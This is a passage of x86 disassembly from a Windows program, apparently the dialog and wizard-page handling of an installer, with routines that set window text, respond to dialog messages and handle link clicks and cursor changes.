  4041c9:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  4041cf:	6a 01                	push   $0x1
  4041d1:	57                   	push   %edi
  4041d2:	89 3d 08 47 43 00    	mov    %edi,0x434708
  4041d8:	ff d6                	call   *%esi
  4041da:	6a 02                	push   $0x2
  4041dc:	57                   	push   %edi
  4041dd:	a3 64 ca 42 00       	mov    %eax,0x42ca64
  4041e2:	ff d6                	call   *%esi
  4041e4:	6a ff                	push   $0xffffffff
  4041e6:	6a 1c                	push   $0x1c
  4041e8:	57                   	push   %edi
  4041e9:	a3 30 aa 42 00       	mov    %eax,0x42aa30
  4041ee:	e8 4b 03 00 00       	call   0x40453e
  4041f3:	ff 35 e8 36 43 00    	push   0x4336e8
  4041f9:	6a f2                	push   $0xfffffff2
  4041fb:	57                   	push   %edi
  4041fc:	ff 15 dc 81 40 00    	call   *0x4081dc
  404202:	6a 04                	push   $0x4
  404204:	e8 02 d2 ff ff       	call   0x40140b
  404209:	a3 cc 36 43 00       	mov    %eax,0x4336cc
  40420e:	33 c0                	xor    %eax,%eax
  404210:	40                   	inc    %eax
  404211:	a3 50 ca 42 00       	mov    %eax,0x42ca50
  404216:	8b 0d 60 a3 40 00    	mov    0x40a360,%ecx
  40421c:	33 ed                	xor    %ebp,%ebp
  40421e:	8b f1                	mov    %ecx,%esi
  404220:	c1 e6 06             	shl    $0x6,%esi
  404223:	03 35 20 47 43 00    	add    0x434720,%esi
  404229:	3b cd                	cmp    %ebp,%ecx
  40422b:	7c 3e                	jl     0x40426b
  40422d:	83 f8 01             	cmp    $0x1,%eax
  404230:	75 31                	jne    0x404263
  404232:	55                   	push   %ebp
  404233:	ff 76 10             	push   0x10(%esi)
  404236:	e8 4e d1 ff ff       	call   0x401389
  40423b:	85 c0                	test   %eax,%eax
  40423d:	74 24                	je     0x404263
  40423f:	6a 01                	push   $0x1
  404241:	55                   	push   %ebp
  404242:	68 0f 04 00 00       	push   $0x40f
  404247:	ff 35 d8 36 43 00    	push   0x4336d8
  40424d:	ff 15 58 82 40 00    	call   *0x408258
  404253:	33 c0                	xor    %eax,%eax
  404255:	39 2d cc 36 43 00    	cmp    %ebp,0x4336cc
  40425b:	0f 94 c0             	sete   %al
  40425e:	e9 aa 02 00 00       	jmp    0x40450d
  404263:	39 2e                	cmp    %ebp,(%esi)
  404265:	0f 84 a0 02 00 00    	je     0x40450b
  40426b:	68 0b 04 00 00       	push   $0x40b
  404270:	e8 15 03 00 00       	call   0x40458a
  404275:	a1 50 ca 42 00       	mov    0x42ca50,%eax
  40427a:	01 05 60 a3 40 00    	add    %eax,0x40a360
  404280:	c1 e0 06             	shl    $0x6,%eax
  404283:	03 f0                	add    %eax,%esi
  404285:	a1 60 a3 40 00       	mov    0x40a360,%eax
  40428a:	3b 05 24 47 43 00    	cmp    0x434724,%eax
  404290:	75 07                	jne    0x404299
  404292:	6a 01                	push   $0x1
  404294:	e8 72 d1 ff ff       	call   0x40140b
  404299:	39 2d cc 36 43 00    	cmp    %ebp,0x4336cc
  40429f:	0f 85 24 02 00 00    	jne    0x4044c9
  4042a5:	a1 24 47 43 00       	mov    0x434724,%eax
  4042aa:	39 05 60 a3 40 00    	cmp    %eax,0x40a360
  4042b0:	0f 83 13 02 00 00    	jae    0x4044c9
  4042b6:	ff 76 24             	push   0x24(%esi)
  4042b9:	8b 5e 14             	mov    0x14(%esi),%ebx
  4042bc:	68 00 40 44 00       	push   $0x444000
  4042c1:	e8 36 23 00 00       	call   0x4065fc
  4042c6:	ff 76 20             	push   0x20(%esi)
  4042c9:	68 19 fc ff ff       	push   $0xfffffc19
  4042ce:	57                   	push   %edi
  4042cf:	e8 6a 02 00 00       	call   0x40453e
  4042d4:	ff 76 1c             	push   0x1c(%esi)
  4042d7:	68 1b fc ff ff       	push   $0xfffffc1b
  4042dc:	57                   	push   %edi
  4042dd:	e8 5c 02 00 00       	call   0x40453e
  4042e2:	ff 76 28             	push   0x28(%esi)
  4042e5:	68 1a fc ff ff       	push   $0xfffffc1a
  4042ea:	57                   	push   %edi
  4042eb:	e8 4e 02 00 00       	call   0x40453e
  4042f0:	6a 03                	push   $0x3
  4042f2:	57                   	push   %edi
  4042f3:	ff 15 3c 82 40 00    	call   *0x40823c
  4042f9:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  4042ff:	89 44 24 30          	mov    %eax,0x30(%esp)
  404303:	74 08                	je     0x40430d
  404305:	66 81 e3 fd fe       	and    $0xfefd,%bx
  40430a:	83 cb 04             	or     $0x4,%ebx
  40430d:	8b cb                	mov    %ebx,%ecx
  40430f:	83 e1 08             	and    $0x8,%ecx
  404312:	51                   	push   %ecx
  404313:	50                   	push   %eax
  404314:	ff 15 28 82 40 00    	call   *0x408228
  40431a:	8b c3                	mov    %ebx,%eax
  40431c:	25 00 01 00 00       	and    $0x100,%eax
  404321:	50                   	push   %eax
  404322:	ff 74 24 34          	push   0x34(%esp)
  404326:	ff 15 50 82 40 00    	call   *0x408250
  40432c:	8b c3                	mov    %ebx,%eax
  40432e:	83 e0 02             	and    $0x2,%eax
  404331:	50                   	push   %eax
  404332:	e8 29 02 00 00       	call   0x404560
  404337:	83 e3 04             	and    $0x4,%ebx
  40433a:	53                   	push   %ebx
  40433b:	ff 35 30 aa 42 00    	push   0x42aa30
  404341:	ff 15 50 82 40 00    	call   *0x408250
  404347:	3b dd                	cmp    %ebp,%ebx
  404349:	74 03                	je     0x40434e
  40434b:	55                   	push   %ebp
  40434c:	eb 02                	jmp    0x404350
  40434e:	6a 01                	push   $0x1
  404350:	68 60 f0 00 00       	push   $0xf060
  404355:	55                   	push   %ebp
  404356:	57                   	push   %edi
  404357:	ff 15 e0 81 40 00    	call   *0x4081e0
  40435d:	50                   	push   %eax
  40435e:	ff 15 e4 81 40 00    	call   *0x4081e4
  404364:	8b 1d 58 82 40 00    	mov    0x408258,%ebx
  40436a:	6a 01                	push   $0x1
  40436c:	55                   	push   %ebp
  40436d:	68 f4 00 00 00       	push   $0xf4
  404372:	ff 74 24 3c          	push   0x3c(%esp)
  404376:	ff d3                	call   *%ebx
  404378:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  40437e:	74 13                	je     0x404393
  404380:	55                   	push   %ebp
  404381:	6a 02                	push   $0x2
  404383:	68 01 04 00 00       	push   $0x401
  404388:	57                   	push   %edi
  404389:	ff d3                	call   *%ebx
  40438b:	ff 35 30 aa 42 00    	push   0x42aa30
  404391:	eb 06                	jmp    0x404399
  404393:	ff 35 64 ca 42 00    	push   0x42ca64
  404399:	e8 d5 01 00 00       	call   0x404573
  40439e:	e8 7d fc ff ff       	call   0x404020
  4043a3:	bb 68 ca 42 00       	mov    $0x42ca68,%ebx
  4043a8:	50                   	push   %eax
  4043a9:	53                   	push   %ebx
  4043aa:	e8 10 22 00 00       	call   0x4065bf
  4043af:	ff 76 18             	push   0x18(%esi)
  4043b2:	53                   	push   %ebx
  4043b3:	e8 1d 22 00 00       	call   0x4065d5
  4043b8:	8d 04 45 68 ca 42 00 	lea    0x42ca68(,%eax,2),%eax
  4043bf:	50                   	push   %eax
  4043c0:	e8 37 22 00 00       	call   0x4065fc
  4043c5:	53                   	push   %ebx
  4043c6:	57                   	push   %edi
  4043c7:	ff 15 1c 82 40 00    	call   *0x40821c
  4043cd:	55                   	push   %ebp
  4043ce:	ff 76 08             	push   0x8(%esi)
  4043d1:	e8 b3 cf ff ff       	call   0x401389
  4043d6:	85 c0                	test   %eax,%eax
  4043d8:	0f 85 97 fe ff ff    	jne    0x404275
  4043de:	39 2e                	cmp    %ebp,(%esi)
  4043e0:	0f 84 8f fe ff ff    	je     0x404275
  4043e6:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  4043ea:	75 1d                	jne    0x404409
  4043ec:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  4043f2:	0f 85 13 01 00 00    	jne    0x40450b
  4043f8:	39 2d 80 47 43 00    	cmp    %ebp,0x434780
  4043fe:	0f 85 71 fe ff ff    	jne    0x404275
  404404:	e9 02 01 00 00       	jmp    0x40450b
  404409:	ff 35 d8 36 43 00    	push   0x4336d8
  40440f:	ff 15 10 82 40 00    	call   *0x408210
  404415:	89 35 40 ba 42 00    	mov    %esi,0x42ba40
  40441b:	39 2e                	cmp    %ebp,(%esi)
  40441d:	0f 8e c5 00 00 00    	jle    0x4044e8
  404423:	8b 46 04             	mov    0x4(%esi),%eax
  404426:	56                   	push   %esi
  404427:	ff 34 85 64 a3 40 00 	push   0x40a364(,%eax,4)
  40442e:	66 8b 06             	mov    (%esi),%ax
  404431:	66 03 05 e0 36 43 00 	add    0x4336e0,%ax
  404438:	57                   	push   %edi
  404439:	0f b7 c0             	movzwl %ax,%eax
  40443c:	50                   	push   %eax
  40443d:	ff 35 00 47 43 00    	push   0x434700
  404443:	ff 15 14 82 40 00    	call   *0x408214
  404449:	3b c5                	cmp    %ebp,%eax
  40444b:	a3 d8 36 43 00       	mov    %eax,0x4336d8
  404450:	0f 84 92 00 00 00    	je     0x4044e8
  404456:	ff 76 2c             	push   0x2c(%esi)
  404459:	6a 06                	push   $0x6
  40445b:	50                   	push   %eax
  40445c:	e8 dd 00 00 00       	call   0x40453e
  404461:	8d 44 24 10          	lea    0x10(%esp),%eax
  404465:	50                   	push   %eax
  404466:	68 fa 03 00 00       	push   $0x3fa
  40446b:	57                   	push   %edi
  40446c:	ff 15 3c 82 40 00    	call   *0x40823c
  404472:	50                   	push   %eax
  404473:	ff 15 e8 81 40 00    	call   *0x4081e8
  404479:	8d 44 24 10          	lea    0x10(%esp),%eax
  40447d:	50                   	push   %eax
  40447e:	57                   	push   %edi
  40447f:	ff 15 ec 81 40 00    	call   *0x4081ec
  404485:	6a 15                	push   $0x15
  404487:	55                   	push   %ebp
  404488:	55                   	push   %ebp
  404489:	ff 74 24 20          	push   0x20(%esp)
  40448d:	ff 74 24 20          	push   0x20(%esp)
  404491:	55                   	push   %ebp
  404492:	ff 35 d8 36 43 00    	push   0x4336d8
  404498:	ff 15 d0 81 40 00    	call   *0x4081d0
  40449e:	55                   	push   %ebp
  40449f:	ff 76 0c             	push   0xc(%esi)
  4044a2:	e8 e2 ce ff ff       	call   0x401389
  4044a7:	39 2d cc 36 43 00    	cmp    %ebp,0x4336cc
  4044ad:	75 5c                	jne    0x40450b
  4044af:	6a 08                	push   $0x8
  4044b1:	ff 35 d8 36 43 00    	push   0x4336d8
  4044b7:	ff 15 28 82 40 00    	call   *0x408228
  4044bd:	68 05 04 00 00       	push   $0x405
  4044c2:	e8 c3 00 00 00       	call   0x40458a
  4044c7:	eb 1f                	jmp    0x4044e8
  4044c9:	ff 35 d8 36 43 00    	push   0x4336d8
  4044cf:	ff 15 10 82 40 00    	call   *0x408210
  4044d5:	ff 35 38 b2 42 00    	push   0x42b238
  4044db:	89 2d 08 47 43 00    	mov    %ebp,0x434708
  4044e1:	57                   	push   %edi
  4044e2:	ff 15 f0 81 40 00    	call   *0x4081f0
  4044e8:	39 2d 68 ea 42 00    	cmp    %ebp,0x42ea68
  4044ee:	75 1b                	jne    0x40450b
  4044f0:	39 2d d8 36 43 00    	cmp    %ebp,0x4336d8
  4044f6:	74 13                	je     0x40450b
  4044f8:	6a 0a                	push   $0xa
  4044fa:	57                   	push   %edi
  4044fb:	ff 15 28 82 40 00    	call   *0x408228
  404501:	c7 05 68 ea 42 00 01 	movl   $0x1,0x42ea68
  404508:	00 00 00 
  40450b:	33 c0                	xor    %eax,%eax
  40450d:	5f                   	pop    %edi
  40450e:	5e                   	pop    %esi
  40450f:	5d                   	pop    %ebp
  404510:	5b                   	pop    %ebx
  404511:	83 c4 10             	add    $0x10,%esp
  404514:	c2 10 00             	ret    $0x10
  404517:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  40451c:	75 06                	jne    0x404524
  40451e:	ff 05 cc 36 43 00    	incl   0x4336cc
  404524:	6a 00                	push   $0x0
  404526:	ff 74 24 08          	push   0x8(%esp)
  40452a:	68 08 04 00 00       	push   $0x408
  40452f:	ff 35 08 47 43 00    	push   0x434708
  404535:	ff 15 58 82 40 00    	call   *0x408258
  40453b:	c2 04 00             	ret    $0x4
  40453e:	ff 74 24 0c          	push   0xc(%esp)
  404542:	6a 00                	push   $0x0
  404544:	e8 b3 20 00 00       	call   0x4065fc
  404549:	50                   	push   %eax
  40454a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40454e:	05 e8 03 00 00       	add    $0x3e8,%eax
  404553:	50                   	push   %eax
  404554:	ff 74 24 0c          	push   0xc(%esp)
  404558:	e8 a0 16 00 00       	call   0x405bfd
  40455d:	c2 0c 00             	ret    $0xc
  404560:	ff 74 24 04          	push   0x4(%esp)
  404564:	ff 35 64 ca 42 00    	push   0x42ca64
  40456a:	ff 15 50 82 40 00    	call   *0x408250
  404570:	c2 04 00             	ret    $0x4
  404573:	6a 01                	push   $0x1
  404575:	ff 74 24 08          	push   0x8(%esp)
  404579:	6a 28                	push   $0x28
  40457b:	ff 35 08 47 43 00    	push   0x434708
  404581:	ff 15 58 82 40 00    	call   *0x408258
  404587:	c2 04 00             	ret    $0x4
  40458a:	a1 d8 36 43 00       	mov    0x4336d8,%eax
  40458f:	85 c0                	test   %eax,%eax
  404591:	74 0f                	je     0x4045a2
  404593:	6a 00                	push   $0x0
  404595:	6a 00                	push   $0x0
  404597:	ff 74 24 0c          	push   0xc(%esp)
  40459b:	50                   	push   %eax
  40459c:	ff 15 58 82 40 00    	call   *0x408258
  4045a2:	c2 04 00             	ret    $0x4
  4045a5:	55                   	push   %ebp
  4045a6:	8b ec                	mov    %esp,%ebp
  4045a8:	83 ec 0c             	sub    $0xc,%esp
  4045ab:	8b 45 08             	mov    0x8(%ebp),%eax
  4045ae:	56                   	push   %esi
  4045af:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  4045b4:	83 f8 05             	cmp    $0x5,%eax
  4045b7:	0f 87 b0 00 00 00    	ja     0x40466d
  4045bd:	6a eb                	push   $0xffffffeb
  4045bf:	ff 75 10             	push   0x10(%ebp)
  4045c2:	ff 15 d4 81 40 00    	call   *0x4081d4
  4045c8:	8b f0                	mov    %eax,%esi
  4045ca:	85 f6                	test   %esi,%esi
  4045cc:	0f 84 9b 00 00 00    	je     0x40466d
  4045d2:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4045d6:	0f 87 91 00 00 00    	ja     0x40466d
  4045dc:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4045e0:	0f 87 87 00 00 00    	ja     0x40466d
  4045e6:	8b 4e 14             	mov    0x14(%esi),%ecx
  4045e9:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4045ef:	75 7c                	jne    0x40466d
  4045f1:	8b 06                	mov    (%esi),%eax
  4045f3:	57                   	push   %edi
  4045f4:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  4045fa:	f6 c1 02             	test   $0x2,%cl
  4045fd:	74 03                	je     0x404602
  4045ff:	50                   	push   %eax
  404600:	ff d7                	call   *%edi
  404602:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  404606:	74 0a                	je     0x404612
  404608:	50                   	push   %eax
  404609:	ff 75 0c             	push   0xc(%ebp)
  40460c:	ff 15 64 80 40 00    	call   *0x408064
  404612:	ff 76 10             	push   0x10(%esi)
  404615:	ff 75 0c             	push   0xc(%ebp)
  404618:	ff 15 60 80 40 00    	call   *0x408060
  40461e:	8b 46 04             	mov    0x4(%esi),%eax
  404621:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  404625:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404628:	74 06                	je     0x404630
  40462a:	50                   	push   %eax
  40462b:	ff d7                	call   *%edi
  40462d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404630:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  404634:	5f                   	pop    %edi
  404635:	74 0a                	je     0x404641
  404637:	50                   	push   %eax
  404638:	ff 75 0c             	push   0xc(%ebp)
  40463b:	ff 15 4c 80 40 00    	call   *0x40804c
  404641:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404645:	74 21                	je     0x404668
  404647:	8b 46 08             	mov    0x8(%esi),%eax
  40464a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40464d:	8b 46 0c             	mov    0xc(%esi),%eax
  404650:	85 c0                	test   %eax,%eax
  404652:	74 07                	je     0x40465b
  404654:	50                   	push   %eax
  404655:	ff 15 54 80 40 00    	call   *0x408054
  40465b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40465e:	50                   	push   %eax
  40465f:	ff 15 58 80 40 00    	call   *0x408058
  404665:	89 46 0c             	mov    %eax,0xc(%esi)
  404668:	8b 46 0c             	mov    0xc(%esi),%eax
  40466b:	eb 02                	jmp    0x40466f
  40466d:	33 c0                	xor    %eax,%eax
  40466f:	5e                   	pop    %esi
  404670:	c9                   	leave
  404671:	c2 0c 00             	ret    $0xc
  404674:	55                   	push   %ebp
  404675:	8b ec                	mov    %esp,%ebp
  404677:	8b 45 10             	mov    0x10(%ebp),%eax
  40467a:	8b 0d 34 aa 42 00    	mov    0x42aa34,%ecx
  404680:	d1 e8                	shr    $1,%eax
  404682:	50                   	push   %eax
  404683:	8b 45 08             	mov    0x8(%ebp),%eax
  404686:	03 c8                	add    %eax,%ecx
  404688:	51                   	push   %ecx
  404689:	ff 75 0c             	push   0xc(%ebp)
  40468c:	ff 15 98 80 40 00    	call   *0x408098
  404692:	ff 75 0c             	push   0xc(%ebp)
  404695:	ff 15 9c 80 40 00    	call   *0x40809c
  40469b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40469e:	03 c0                	add    %eax,%eax
  4046a0:	89 01                	mov    %eax,(%ecx)
  4046a2:	01 05 34 aa 42 00    	add    %eax,0x42aa34
  4046a8:	33 c0                	xor    %eax,%eax
  4046aa:	5d                   	pop    %ebp
  4046ab:	c2 10 00             	ret    $0x10
  4046ae:	55                   	push   %ebp
  4046af:	8b ec                	mov    %esp,%ebp
  4046b1:	a1 34 aa 42 00       	mov    0x42aa34,%eax
  4046b6:	56                   	push   %esi
  4046b7:	8b 75 08             	mov    0x8(%ebp),%esi
  4046ba:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4046bd:	50                   	push   %eax
  4046be:	ff 15 9c 80 40 00    	call   *0x40809c
  4046c4:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4046c7:	d1 e9                	shr    $1,%ecx
  4046c9:	3b c1                	cmp    %ecx,%eax
  4046cb:	72 02                	jb     0x4046cf
  4046cd:	8b c1                	mov    %ecx,%eax
  4046cf:	33 c9                	xor    %ecx,%ecx
  4046d1:	51                   	push   %ecx
  4046d2:	51                   	push   %ecx
  4046d3:	ff 75 10             	push   0x10(%ebp)
  4046d6:	ff 75 0c             	push   0xc(%ebp)
  4046d9:	50                   	push   %eax
  4046da:	a1 34 aa 42 00       	mov    0x42aa34,%eax
  4046df:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4046e2:	50                   	push   %eax
  4046e3:	51                   	push   %ecx
  4046e4:	51                   	push   %ecx
  4046e5:	ff 15 94 80 40 00    	call   *0x408094
  4046eb:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4046ee:	5e                   	pop    %esi
  4046ef:	89 01                	mov    %eax,(%ecx)
  4046f1:	01 05 34 aa 42 00    	add    %eax,0x42aa34
  4046f7:	33 c0                	xor    %eax,%eax
  4046f9:	5d                   	pop    %ebp
  4046fa:	c2 10 00             	ret    $0x10
  4046fd:	55                   	push   %ebp
  4046fe:	8b ec                	mov    %esp,%ebp
  404700:	83 ec 0c             	sub    $0xc,%esp
  404703:	53                   	push   %ebx
  404704:	33 db                	xor    %ebx,%ebx
  404706:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40470d:	56                   	push   %esi
  40470e:	57                   	push   %edi
  40470f:	0f 85 1a 01 00 00    	jne    0x40482f
  404715:	8b 7d 14             	mov    0x14(%ebp),%edi
  404718:	8b 47 30             	mov    0x30(%edi),%eax
  40471b:	3b c3                	cmp    %ebx,%eax
  40471d:	7d 11                	jge    0x404730
  40471f:	8b 0d dc 36 43 00    	mov    0x4336dc,%ecx
  404725:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40472c:	2b c8                	sub    %eax,%ecx
  40472e:	8b 01                	mov    (%ecx),%eax
  404730:	8b 0d 38 47 43 00    	mov    0x434738,%ecx
  404736:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  404739:	0f b7 08             	movzwl (%eax),%ecx
  40473c:	40                   	inc    %eax
  40473d:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404740:	40                   	inc    %eax
  404741:	83 f9 02             	cmp    $0x2,%ecx
  404744:	89 45 14             	mov    %eax,0x14(%ebp)
  404747:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40474a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40474d:	c7 45 fc ae 46 40 00 	movl   $0x4046ae,-0x4(%ebp)
  404754:	74 07                	je     0x40475d
  404756:	c7 45 fc 74 46 40 00 	movl   $0x404674,-0x4(%ebp)
  40475d:	8b 47 14             	mov    0x14(%edi),%eax
  404760:	ff 77 34             	push   0x34(%edi)
  404763:	8b f0                	mov    %eax,%esi
  404765:	83 e0 01             	and    $0x1,%eax
  404768:	f7 d6                	not    %esi
  40476a:	c1 ee 05             	shr    $0x5,%esi
  40476d:	6a 22                	push   $0x22
  40476f:	83 e6 01             	and    $0x1,%esi
  404772:	ff 75 08             	push   0x8(%ebp)
  404775:	0b f0                	or     %eax,%esi
  404777:	e8 c2 fd ff ff       	call   0x40453e
  40477c:	ff 77 38             	push   0x38(%edi)
  40477f:	6a 23                	push   $0x23
  404781:	ff 75 08             	push   0x8(%ebp)
  404784:	e8 b5 fd ff ff       	call   0x40453e
  404789:	33 c0                	xor    %eax,%eax
  40478b:	3b f3                	cmp    %ebx,%esi
  40478d:	0f 94 c0             	sete   %al
  404790:	05 0a 04 00 00       	add    $0x40a,%eax
  404795:	6a 01                	push   $0x1
  404797:	50                   	push   %eax
  404798:	ff 75 08             	push   0x8(%ebp)
  40479b:	ff 15 c0 81 40 00    	call   *0x4081c0
  4047a1:	56                   	push   %esi
  4047a2:	e8 b9 fd ff ff       	call   0x404560
  4047a7:	68 e8 03 00 00       	push   $0x3e8
  4047ac:	ff 75 08             	push   0x8(%ebp)
  4047af:	ff 15 3c 82 40 00    	call   *0x40823c
  4047b5:	8b f8                	mov    %eax,%edi
  4047b7:	57                   	push   %edi
  4047b8:	e8 b6 fd ff ff       	call   0x404573
  4047bd:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4047c3:	53                   	push   %ebx
  4047c4:	6a 01                	push   $0x1
  4047c6:	68 5b 04 00 00       	push   $0x45b
  4047cb:	57                   	push   %edi
  4047cc:	ff d6                	call   *%esi
  4047ce:	a1 10 47 43 00       	mov    0x434710,%eax
  4047d3:	8b 40 68             	mov    0x68(%eax),%eax
  4047d6:	3b c3                	cmp    %ebx,%eax
  4047d8:	7d 09                	jge    0x4047e3
  4047da:	f7 d8                	neg    %eax
  4047dc:	50                   	push   %eax
  4047dd:	ff 15 cc 81 40 00    	call   *0x4081cc
  4047e3:	50                   	push   %eax
  4047e4:	53                   	push   %ebx
  4047e5:	68 43 04 00 00       	push   $0x443
  4047ea:	57                   	push   %edi
  4047eb:	ff d6                	call   *%esi
  4047ed:	68 00 00 01 04       	push   $0x4010000
  4047f2:	53                   	push   %ebx
  4047f3:	68 45 04 00 00       	push   $0x445
  4047f8:	57                   	push   %edi
  4047f9:	ff d6                	call   *%esi
  4047fb:	ff 75 14             	push   0x14(%ebp)
  4047fe:	e8 d2 1d 00 00       	call   0x4065d5
  404803:	50                   	push   %eax
  404804:	53                   	push   %ebx
  404805:	68 35 04 00 00       	push   $0x435
  40480a:	57                   	push   %edi
  40480b:	ff d6                	call   *%esi
  40480d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404810:	89 1d 34 aa 42 00    	mov    %ebx,0x42aa34
  404816:	50                   	push   %eax
  404817:	ff 75 0c             	push   0xc(%ebp)
  40481a:	68 49 04 00 00       	push   $0x449
  40481f:	57                   	push   %edi
  404820:	ff d6                	call   *%esi
  404822:	89 1d 34 aa 42 00    	mov    %ebx,0x42aa34
  404828:	33 c0                	xor    %eax,%eax
  40482a:	e9 52 01 00 00       	jmp    0x404981
  40482f:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404836:	8b 35 58 82 40 00    	mov    0x408258,%esi
  40483c:	75 5b                	jne    0x404899
  40483e:	8b 45 10             	mov    0x10(%ebp),%eax
  404841:	c1 e8 10             	shr    $0x10,%eax
  404844:	66 85 c0             	test   %ax,%ax
  404847:	0f 85 25 01 00 00    	jne    0x404972
  40484d:	39 1d 34 aa 42 00    	cmp    %ebx,0x42aa34
  404853:	0f 85 19 01 00 00    	jne    0x404972
  404859:	a1 40 ba 42 00       	mov    0x42ba40,%eax
  40485e:	8d 78 14             	lea    0x14(%eax),%edi
  404861:	f6 07 20             	testb  $0x20,(%edi)
  404864:	0f 84 08 01 00 00    	je     0x404972
  40486a:	53                   	push   %ebx
  40486b:	53                   	push   %ebx
  40486c:	68 f0 00 00 00       	push   $0xf0
  404871:	68 0a 04 00 00       	push   $0x40a
  404876:	ff 75 08             	push   0x8(%ebp)
  404879:	ff 15 3c 82 40 00    	call   *0x40823c
  40487f:	50                   	push   %eax
  404880:	ff d6                	call   *%esi
  404882:	8b 0f                	mov    (%edi),%ecx
  404884:	83 e0 01             	and    $0x1,%eax
  404887:	83 e1 fe             	and    $0xfffffffe,%ecx
  40488a:	50                   	push   %eax
  40488b:	0b c8                	or     %eax,%ecx
  40488d:	89 0f                	mov    %ecx,(%edi)
  40488f:	e8 cc fc ff ff       	call   0x404560
  404894:	e8 ef 00 00 00       	call   0x404988
  404899:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40489d:	0f 85 c0 00 00 00    	jne    0x404963
  4048a3:	68 e8 03 00 00       	push   $0x3e8
  4048a8:	ff 75 08             	push   0x8(%ebp)
  4048ab:	ff 15 3c 82 40 00    	call   *0x40823c
  4048b1:	8b 7d 14             	mov    0x14(%ebp),%edi
  4048b4:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4048bb:	75 67                	jne    0x404924
  4048bd:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4048c4:	75 5e                	jne    0x404924
  4048c6:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4048c9:	8b 57 18             	mov    0x18(%edi),%edx
  4048cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4048cf:	2b ca                	sub    %edx,%ecx
  4048d1:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4048d7:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4048da:	c7 45 fc a0 26 43 00 	movl   $0x4326a0,-0x4(%ebp)
  4048e1:	73 41                	jae    0x404924
  4048e3:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4048e6:	51                   	push   %ecx
  4048e7:	53                   	push   %ebx
  4048e8:	68 4b 04 00 00       	push   $0x44b
  4048ed:	50                   	push   %eax
  4048ee:	ff d6                	call   *%esi
  4048f0:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  4048f6:	68 02 7f 00 00       	push   $0x7f02
  4048fb:	53                   	push   %ebx
  4048fc:	ff d7                	call   *%edi
  4048fe:	50                   	push   %eax
  4048ff:	ff 15 c8 81 40 00    	call   *0x4081c8
  404905:	6a 01                	push   $0x1
  404907:	ff 75 fc             	push   -0x4(%ebp)
  40490a:	ff 75 08             	push   0x8(%ebp)
  40490d:	e8 9a 00 00 00       	call   0x4049ac
  404912:	68 00 7f 00 00       	push   $0x7f00
  404917:	53                   	push   %ebx
  404918:	ff d7                	call   *%edi
  40491a:	50                   	push   %eax
  40491b:	ff 15 c8 81 40 00    	call   *0x4081c8
  404921:	8b 7d 14             	mov    0x14(%ebp),%edi
  404924:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  40492b:	75 48                	jne    0x404975
  40492d:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404934:	75 3f                	jne    0x404975
  404936:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  40493a:	75 10                	jne    0x40494c
  40493c:	53                   	push   %ebx
  40493d:	6a 01                	push   $0x1
  40493f:	68 11 01 00 00       	push   $0x111
  404944:	ff 35 08 47 43 00    	push   0x434708
  40494a:	ff d6                	call   *%esi
  40494c:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404950:	75 0c                	jne    0x40495e
  404952:	53                   	push   %ebx
  404953:	53                   	push   %ebx
  404954:	6a 10                	push   $0x10
  404956:	ff 35 08 47 43 00    	push   0x434708
  40495c:	ff d6                	call   *%esi
  40495e:	33 c0                	xor    %eax,%eax
  404960:	40                   	inc    %eax
  404961:	eb 1e                	jmp    0x404981
  404963:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40496a:	75 06                	jne    0x404972
  40496c:	ff 05 34 aa 42 00    	incl   0x42aa34
  404972:	8b 7d 14             	mov    0x14(%ebp),%edi
  404975:	57                   	push   %edi
  404976:	ff 75 10             	push   0x10(%ebp)
  404979:	ff 75 0c             	push   0xc(%ebp)
  40497c:	e8 24 fc ff ff       	call   0x4045a5
  404981:	5f                   	pop    %edi
  404982:	5e                   	pop    %esi
  404983:	5b                   	pop    %ebx
  404984:	c9                   	leave
  404985:	c2 10 00             	ret    $0x10
  404988:	83 3d 8c 47 43 00 00 	cmpl   $0x0,0x43478c
